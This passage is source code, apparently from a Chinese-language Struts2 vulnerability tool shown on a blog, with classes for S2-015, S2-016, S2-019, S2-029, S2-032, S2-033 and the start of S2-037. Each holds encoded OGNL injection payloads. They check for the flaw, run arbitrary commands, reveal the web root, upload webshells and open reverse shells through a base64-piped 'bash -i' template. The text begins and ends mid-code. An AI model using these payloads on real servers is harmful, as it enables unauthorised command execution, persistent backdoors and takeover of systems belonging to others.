cmd):</span><br><span class="line">        &quot;&quot;&quot;执行命令&quot;&quot;&quot;</span><br><span class="line">        html = get(self.url + &quot;?x=&#123;payload&#125;&quot;.format(payload=self.exec_payload.format(cmd=quote(cmd))), self.headers,</span><br><span class="line">                   self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def reverse_shell(self, ip, port):</span><br><span class="line">        &quot;&quot;&quot;反弹shell&quot;&quot;&quot;</span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def upload_shell(self, upload_path, shell_path):</span><br><span class="line">        shell = read_file(shell_path, self.encoding)</span><br><span class="line">        data = &quot;t=&#123;t&#125;&amp;f=&#123;f&#125;&quot;.format(t=quote(shell), f=upload_path)</span><br><span class="line">        html = post(self.url + &quot;?x=&#123;payload&#125;&quot;.format(payload=self.upload_paylaod), data, self.headers, self.encoding)</span><br><span class="line">        if html == &#x27;OK&#x27;:</span><br><span class="line">            return True</span><br><span class="line">        else:</span><br><span class="line">            return False</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_015:</span><br><span class="line">    &quot;&quot;&quot;S2-015漏洞检测利用类&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-015:影响版本Struts 2.0.0-2.3.14.2; GET请求发送数据; 支持任意命令执行和反弹shell&quot;</span><br><span class="line">    exec_payload = &quot;%24%7B%23context%5B&#x27;xwork.MethodAccessor.denyMethodExecution&#x27;%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass().getDeclaredField(&#x27;allowStaticMethodAccess&#x27;)%2C%23m.setAccessible(true)%2C%23m.set(%23_memberAccess%2Ctrue)%2C%23q%3D%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec(&#x27;&#123;cmd&#125;&#x27;).getInputStream())%2C%23q%7D&quot;</span><br><span class="line">    shell = &quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        if url.endswith(&quot;.action&quot;):</span><br><span class="line">            rindex = url.rindex(&#x27;/&#x27;)</span><br><span class="line">            self.url = url[:rindex + 1]</span><br><span class="line">        elif url.endswith(&quot;/&quot;):</span><br><span class="line">            self.url = url</span><br><span class="line">        else:</span><br><span class="line">            self.url = url + &#x27;/&#x27;</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;检测漏洞是否存在&quot;&quot;&quot;</span><br><span class="line">        html = echo_check(self)</span><br><span class="line">        if str(html).startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        if html:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            return &#x27;S2-015&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;执行命令&quot;&quot;&quot;</span><br><span class="line">        payload = self.exec_payload.format(cmd=quote(cmd))</span><br><span class="line">        html = get(self.url + &quot;&#123;payload&#125;.action&quot;.format(payload=payload), self.headers, self.encoding)</span><br><span class="line">        if html.startswith(&#x27;ERROR:&#x27;):</span><br><span class="line">            return html</span><br><span class="line">        try:</span><br><span class="line">            soup = BeautifulSoup(html, &#x27;lxml&#x27;)</span><br><span class="line">            ps = soup.find_all(&#x27;p&#x27;)</span><br><span class="line">            result = unquote(ps[1].text[9:-4]).strip()</span><br><span class="line">            return result</span><br><span class="line">        except Exception as e:</span><br><span class="line">            return html</span><br><span class="line"> </span><br><span class="line">    def reverse_shell(self, ip, port):</span><br><span class="line">        &quot;&quot;&quot;反弹shell&quot;&quot;&quot;</span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_016:</span><br><span class="line">    &quot;&quot;&quot;S2-016漏洞检测利用类&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-016:影响版本Struts 2.0.0-2.3.15; GET请求发送数据; 支持获取WEB路径,任意命令执行,反弹shell和文件上传&quot;</span><br><span class="line">    check_poc = &quot;redirect%3A%24%7B&#123;num1&#125;%2B&#123;num2&#125;%7D&quot;</span><br><span class="line">    web_path = &quot;redirect:$%7B%23a%3d%23context.get(&#x27;com.opensymphony.xwork2.dispatcher.HttpServletRequest&#x27;),%23b%3d%23a.getRealPath(%22/%22),%23matt%3d%23context.get(&#x27;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#x27;),%23matt.getWriter().println(%23b),%23matt.getWriter().flush(),%23matt.getWriter().close()%7D&quot;</span><br><span class="line">    exec_payload1 = &quot;redirect%3A%24%7B%23a%3D(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%20%7B&#123;cmd&#125;%7D)).start()%2C%23b%3D%23a.getInputStream()%2C%23c%3Dnew%20java.io.InputStreamReader%20(%23b)%2C%23d%3Dnew%20java.io.BufferedReader(%23c)%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read(%23e)%2C%23matt%3D%20%23context.get(&#x27;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#x27;)%2C%23matt.getWriter().println%20(%23e)%2C%23matt.getWriter().flush()%2C%23matt.getWriter().close()%7D&quot;</span><br><span class="line">    exec_payload2 = &quot;redirect%3A%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23_memberAccess%2Ctrue)%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22&#123;cmd&#125;%22).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B5000%5D%2C%23c.read(%23d)%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%23d)%2C%23genxor.flush()%2C%23genxor.close()%7D&quot;</span><br><span class="line">    exec_payload3 = r&quot;redirect:$&#123;%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23s%3dnew%20java.util.Scanner((new%20java.lang.ProcessBuilder(%27CMD%27.toString().split(%27\\s%27))).start().getInputStream()).useDelimiter(%27\\AAAA%27),%23str%3d%23s.hasNext()?%23s.next():%27%27,%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27ENCODING%27),%23resp.getWriter().println(%23str),%23resp.getWriter().flush(),%23resp.getWriter().close()&#125;&quot;</span><br><span class="line">    upload_payload1 = r&quot;&quot;&quot;redirect:$&#123;%23req%3d%23context.get(&#x27;com.opensymphony.xwork2.dispatcher.HttpServletRequest&#x27;),%23res%3d%23context.get(&#x27;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#x27;),%23res.getWriter().print(%22O%22),%23res.getWriter().print(%22K%22),%23res.getWriter().flush(),%23res.getWriter().close(),new+java.io.BufferedWriter(new+java.io.FileWriter(%22PATH%22)).append(%23req.getParameter(%22t%22)).close()&#125;&amp;t=SHELL&quot;&quot;&quot;</span><br><span class="line">    upload_payload2 = &quot;redirect%3A%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23_memberAccess%2Ctrue)%2C%23a%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletRequest%22)%2C%23b%3Dnew%20java.io.FileOutputStream(new%20java.lang.StringBuilder(%23a.getRealPath(%22%2F%22)).append(%40java.io.File%40separator).append(%22&#123;path&#125;%22).toString())%2C%23b.write(%23a.getParameter(%22t%22).getBytes())%2C%23b.close()%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%22OK%22)%2C%23genxor.flush()%2C%23genxor.close()%7D&quot;</span><br><span class="line">    shell = &quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        self.url = url</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line">        self.exec_payload = &quot;payload1&quot;</span><br><span class="line">        self.exec_dict = &#123;&quot;payload1&quot;: self.exec_cmd1, &quot;payload2&quot;: self.exec_cmd2, &quot;payload3&quot;: self.exec_cmd3&#125;</span><br><span class="line">        if &#x27;Content-Type&#x27; not in self.headers:</span><br><span class="line">            self.headers[&#x27;Content-Type&#x27;] = &#x27;application/x-www-form-urlencoded&#x27;</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;检测漏洞是否存在&quot;&quot;&quot;</span><br><span class="line">        num1 = random.randint(10000, 100000)</span><br><span class="line">        num2 = random.randint(10000, 100000)</span><br><span class="line">        poc = self.check_poc.format(num1=num1, num2=num2)</span><br><span class="line">        html = get(self.url + &#x27;?&#x27; + poc, self.headers, self.encoding)</span><br><span class="line">        nn = str(num1 + num2)</span><br><span class="line">        if html.startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        elif nn in html:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            self.select_exec()</span><br><span class="line">            return &#x27;S2-016&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def get_path(self):</span><br><span class="line">        &quot;&quot;&quot;获取web目录&quot;&quot;&quot;</span><br><span class="line">        html = get(self.url + &quot;?&quot; + self.web_path, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def echo_check(self, exec_fun):</span><br><span class="line">        &quot;&quot;&quot;通过echo输出检查漏洞是否存在&quot;&quot;&quot;</span><br><span class="line">        hash_str = get_hash()</span><br><span class="line">        html = exec_fun(&quot;echo &quot; + hash_str)</span><br><span class="line">        if hash_str in html:</span><br><span class="line">            return True</span><br><span class="line">        else:</span><br><span class="line">            return False</span><br><span class="line"> </span><br><span class="line">    def select_exec(self):</span><br><span class="line">        &quot;&quot;&quot;选择合适的执行命令的exp&quot;&quot;&quot;</span><br><span class="line">        result = self.echo_check(self.exec_cmd1)</span><br><span class="line">        if result:</span><br><span class="line">            self.exec_payload = &quot;payload1&quot;</span><br><span class="line">        else:</span><br><span class="line">            result = self.echo_check(self.exec_cmd2)</span><br><span class="line">            if result:</span><br><span class="line">                self.exec_payload = &quot;payload2&quot;</span><br><span class="line">            else:</span><br><span class="line">                result = self.echo_check(self.exec_cmd3)</span><br><span class="line">                if result:</span><br><span class="line">                    self.exec_payload = &quot;payload3&quot;</span><br><span class="line">                else:</span><br><span class="line">                    self.exec_payload = &quot;None&quot;</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        if self.exec_payload not in self.exec_dict:</span><br><span class="line">            # print(&quot;[+] 本程序S2_016预设EXP对 &#123;url&#125; 无效!&quot;.format(url=self.url))</span><br><span class="line">            return None</span><br><span class="line">        result = self.exec_dict.get(self.exec_payload)(cmd)</span><br><span class="line">        return result</span><br><span class="line"> </span><br><span class="line">    def exec_cmd1(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;执行命令&quot;&quot;&quot;</span><br><span class="line">        cmd = parse_cmd(cmd)</span><br><span class="line">        html = get(self.url + &quot;?&quot; + self.exec_payload1.format(cmd=quote(cmd)), self.headers,</span><br><span class="line">                   self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def exec_cmd2(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;执行命令&quot;&quot;&quot;</span><br><span class="line">        html = get(self.url + &quot;?&quot; + self.exec_payload2.format(cmd=quote(cmd)), self.headers,</span><br><span class="line">                   self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def exec_cmd3(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;执行命令&quot;&quot;&quot;</span><br><span class="line">        html = get(self.url + &quot;?&quot; + self.exec_payload3.replace(&#x27;CMD&#x27;, quote(cmd)).replace(&#x27;ENCODING&#x27;, self.encoding),</span><br><span class="line">                   self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def reverse_shell(self, ip, port):</span><br><span class="line">        &quot;&quot;&quot;反弹shell&quot;&quot;&quot;</span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def upload_shell1(self, upload_path, shell_path):</span><br><span class="line">        shell = read_file(shell_path, self.encoding)</span><br><span class="line">        data = self.upload_payload1.replace(&#x27;PATH&#x27;, quote(upload_path)).replace(&#x27;SHELL&#x27;, quote(shell))</span><br><span class="line">        html = post(self.url, data, self.headers, self.encoding)</span><br><span class="line">        if html == &#x27;OK&#x27;:</span><br><span class="line">            return True</span><br><span class="line">        else:</span><br><span class="line">            return False</span><br><span class="line"> </span><br><span class="line">    def upload_shell2(self, upload_path, shell_path):</span><br><span class="line">        shell = read_file(shell_path, self.encoding)</span><br><span class="line">        data = &quot;t=&quot; + quote(shell)</span><br><span class="line">        web_path = self.get_path()</span><br><span class="line">        upload_path = upload_path.replace(web_path, &#x27;&#x27;)</span><br><span class="line">        html = post(self.url + &#x27;?&#x27; + self.upload_payload2.format(path=upload_path), data, self.headers, self.encoding)</span><br><span class="line">        if html == &#x27;OK&#x27;:</span><br><span class="line">            return True</span><br><span class="line">        else:</span><br><span class="line">            return False</span><br><span class="line"> </span><br><span class="line">    def upload_shell(self, upload_path, shell_path):</span><br><span class="line">        result = self.upload_shell1(upload_path, shell_path)</span><br><span class="line">        if not result:</span><br><span class="line">            result = self.upload_shell2(upload_path, shell_path)</span><br><span class="line">        return result</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_019:</span><br><span class="line">    &quot;&quot;&quot;S2-019漏洞检测利用类&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-019:影响版本Struts 2.0.0-2.3.15.1; GET请求发送数据; 支持获取WEB路径,任意命令执行,反弹shell和文件上传&quot;</span><br><span class="line">    web_path = &quot;%23req%3D%23context.get(&#x27;com.opensymphony.xwork2.dispatcher.HttpServletRequest&#x27;)%2C%23resp%3D%23context.get(&#x27;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#x27;)%2C%23resp.setCharacterEncoding(&#x27;&#123;encoding&#125;&#x27;)%2C%23resp.getWriter().println(%23req.getSession().getServletContext().getRealPath(&#x27;%2F&#x27;))%2C%23resp.getWriter().flush()%2C%23resp.getWriter().close()&quot;</span><br><span class="line">    exec_payload = &quot;%23f%3D%23_memberAccess.getClass().getDeclaredField(&#x27;allowStaticMethodAccess&#x27;)%2C%23f.setAccessible(true)%2C%23f.set(%23_memberAccess%2Ctrue)%2C%23req%3D%40org.apache.struts2.ServletActionContext%40getRequest()%2C%23resp%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23a%3D(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%7B&#123;cmd&#125;%7D)).start()%2C%23b%3D%23a.getInputStream()%2C%23c%3Dnew%20java.io.InputStreamReader(%23b)%2C%23d%3Dnew%20java.io.BufferedReader(%23c)%2C%23e%3Dnew%20char%5B1000%5D%2C%23d.read(%23e)%2C%23resp.println(%23e)%2C%23resp.close()&quot;</span><br><span class="line">    upload_payload = r&quot;&quot;&quot;debug=command&amp;expression=%23req%3d%23context.get(&#x27;com.opensymphony.xwork2.dispatcher.HttpServletRequest&#x27;),%23res%3d%23context.get(&#x27;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#x27;),%23res.getWriter().print(%22O%22),%23res.getWriter().print(%22K%22),%23res.getWriter().flush(),%23res.getWriter().close(),new+java.io.BufferedWriter(new+java.io.FileWriter(%22&#123;path&#125;%22)).append(%23req.getParameter(%22shell%22)).close()&amp;shell=&#123;shell&#125;&quot;&quot;&quot;</span><br><span class="line">    shell = &quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        self.url = url</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line">        if &#x27;Content-Type&#x27; not in self.headers:</span><br><span class="line">            self.headers[&#x27;Content-Type&#x27;] = &#x27;application/x-www-form-urlencoded&#x27;</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;检测漏洞是否存在&quot;&quot;&quot;</span><br><span class="line">        html = echo_check(self)</span><br><span class="line">        if str(html).startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        if html:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            return &#x27;S2-019&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def get_path(self):</span><br><span class="line">        &quot;&quot;&quot;获取web目录&quot;&quot;&quot;</span><br><span class="line">        html = get(self.url + &quot;?debug=command&amp;expression=&#123;payload&#125;&quot;.format(</span><br><span class="line">            payload=self.web_path.format(encoding=self.encoding)), self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;执行命令&quot;&quot;&quot;</span><br><span class="line">        cmd = parse_cmd(cmd)</span><br><span class="line">        html = get(</span><br><span class="line">            self.url + &quot;?debug=command&amp;expression=&#123;payload&#125;&quot;.format(payload=self.exec_payload.format(cmd=quote(cmd))),</span><br><span class="line">            self.headers,</span><br><span class="line">            self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def reverse_shell(self, ip, port):</span><br><span class="line">        &quot;&quot;&quot;反弹shell&quot;&quot;&quot;</span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def upload_shell(self, upload_path, shell_path):</span><br><span class="line">        shell = read_file(shell_path, self.encoding)</span><br><span class="line">        data = self.upload_payload.format(path=quote(upload_path), shell=quote(shell))</span><br><span class="line">        html = post(self.url, data, self.headers, self.encoding)</span><br><span class="line">        if html == &#x27;OK&#x27;:</span><br><span class="line">            return True</span><br><span class="line">        else:</span><br><span class="line">            return False</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_029:</span><br><span class="line">    &quot;&quot;&quot;S2-029漏洞检测利用类&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-029:影响版本Struts 2.0.0-2.3.24.1(除了2.3.20.3); POST请求发送数据,需要参数; 默认参数:message; 支持任意命令执行和反弹shell&quot;</span><br><span class="line">    exec_payload = &quot;(%23_memberAccess%5B&#x27;allowPrivateAccess&#x27;%5D%3Dtrue%2C%23_memberAccess%5B&#x27;allowProtectedAccess&#x27;%5D%3Dtrue%2C%23_memberAccess%5B&#x27;excludedPackageNamePatterns&#x27;%5D%3D%23_memberAccess%5B&#x27;acceptProperties&#x27;%5D%2C%23_memberAccess%5B&#x27;excludedClasses&#x27;%5D%3D%23_memberAccess%5B&#x27;acceptProperties&#x27;%5D%2C%23_memberAccess%5B&#x27;allowPackageProtectedAccess&#x27;%5D%3Dtrue%2C%23_memberAccess%5B&#x27;allowStaticMethodAccess&#x27;%5D%3Dtrue%2C%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec(&#x27;&#123;cmd&#125;&#x27;).getInputStream()))&quot;</span><br><span class="line">    shell = &quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        self.url = url</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        if not data:</span><br><span class="line">            self.data = &quot;message=&#123;exp&#125;&quot;</span><br><span class="line">        else:</span><br><span class="line">            self.data = data</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line">        if &#x27;Content-Type&#x27; not in self.headers:</span><br><span class="line">            self.headers[&#x27;Content-Type&#x27;] = &#x27;application/x-www-form-urlencoded&#x27;</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;检测漏洞是否存在&quot;&quot;&quot;</span><br><span class="line">        html = echo_check(self)</span><br><span class="line">        if str(html).startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        if html:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            return &#x27;S2-029&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;执行命令&quot;&quot;&quot;</span><br><span class="line">        data = self.data.format(exp=self.exec_payload.format(cmd=quote(cmd)))</span><br><span class="line">        html = post(self.url, data, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def reverse_shell(self, ip, port):</span><br><span class="line">        &quot;&quot;&quot;反弹shell&quot;&quot;&quot;</span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_032:</span><br><span class="line">    &quot;&quot;&quot;S2-032漏洞检测利用类&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-032:影响版本Struts 2.3.20-2.3.28(除了2.3.20.3和2.3.24.3); GET请求发送数据; 支持获取WEB路径,任意命令执行和反弹shell&quot;</span><br><span class="line">    check_poc = &quot;method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23context[%23parameters.obj[0]].getWriter().print(%23parameters.content[0]%2b602%2b53718),1?%23xx:%23request.toString&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=10086&quot;</span><br><span class="line">    web_path = &quot;method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23path%3d%23req.getRealPath(%23parameters.pp[0]),%23w%3d%23res.getWriter(),%23w.print(%23path),1?%23xx:%23request.toString&amp;pp=%2f&amp;encoding=&#123;encoding&#125;&quot;</span><br><span class="line">    exec_payload = &quot;method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&amp;pp=%5C%5CA&amp;ppp=%20&amp;encoding=&#123;encoding&#125;&amp;cmd=&#123;cmd&#125;&quot;</span><br><span class="line">    shell = &quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        self.url = url</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;选择可以利用成功的payload&quot;&quot;&quot;</span><br><span class="line">        html = get(self.url + &#x27;?&#x27; + self.check_poc, self.headers, self.encoding)</span><br><span class="line">        if html.startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        elif html == &quot;1008660253718&quot;:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            return &#x27;S2-032&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def get_path(self):</span><br><span class="line">        &quot;&quot;&quot;获取web目录&quot;&quot;&quot;</span><br><span class="line">        html = get(self.url + &#x27;?&#x27; + self.web_path.format(encoding=self.encoding), self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;执行命令&quot;&quot;&quot;</span><br><span class="line">        payload = self.exec_payload.format(cmd=quote(cmd), encoding=self.encoding)</span><br><span class="line">        html = get_stream(self.url + &#x27;?&#x27; + payload, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def reverse_shell(self, ip, port):</span><br><span class="line">        &quot;&quot;&quot;反弹shell&quot;&quot;&quot;</span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_033:</span><br><span class="line">    &quot;&quot;&quot;S2-033漏洞检测利用类&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-033:影响版本Struts 2.3.20-2.3.28(除了2.3.20.3和2.3.24.3); GET请求发送数据; 支持任意命令执行和反弹shell&quot;</span><br><span class="line">    check_poc = &quot;%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23parameters.content[0]%2b602%2b53718),%23wr.close(),xx.toString.json?&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=10086&quot;</span><br><span class="line">    exec_payload = &quot;%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23xx%3d123,%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=2908&amp;command=&#123;cmd&#125;&quot;</span><br><span class="line">    shell = &quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        if url.endswith(&#x27;/&#x27;):</span><br><span class="line">            self.url = url</span><br><span class="line">        else:</span><br><span class="line">            self.url = url + &#x27;/&#x27;</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;选择可以利用成功的payload&quot;&quot;&quot;</span><br><span class="line">        html = get(self.url + self.check_poc, self.headers, self.encoding)</span><br><span class="line">        if html.startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        elif html == &quot;1008660253718&quot;:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            return &#x27;S2-033&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;执行命令&quot;&quot;&quot;</span><br><span class="line">        payload = self.exec_payload.format(cmd=quote(cmd))</span><br><span class="line">        html = get_stream(self.url + payload, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def reverse_shell(self, ip, port):</span><br><span class="line">        &quot;&quot;&quot;反弹shell&quot;&quot;&quot;</span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_037:</span><br><span class="line">    &quot;&quot;&quot;S2-037漏洞检测利用类&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-037:影响版本Struts 2.3.20-2.3.28.1; GET请求发送数据; 支持获取WEB路径,任意命令执行和反弹shell&quot;</span><br><span class="line">    web_path = &quot;%28%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29%3f(%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23wr.println(%23req.getRealPath(%23parameters.pp%5B0%5D)),%23wr.flush(),%23wr.close()):xx.toString.json?&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;pp=%2f&quot;</span><br><span class="line">    exec_payload = 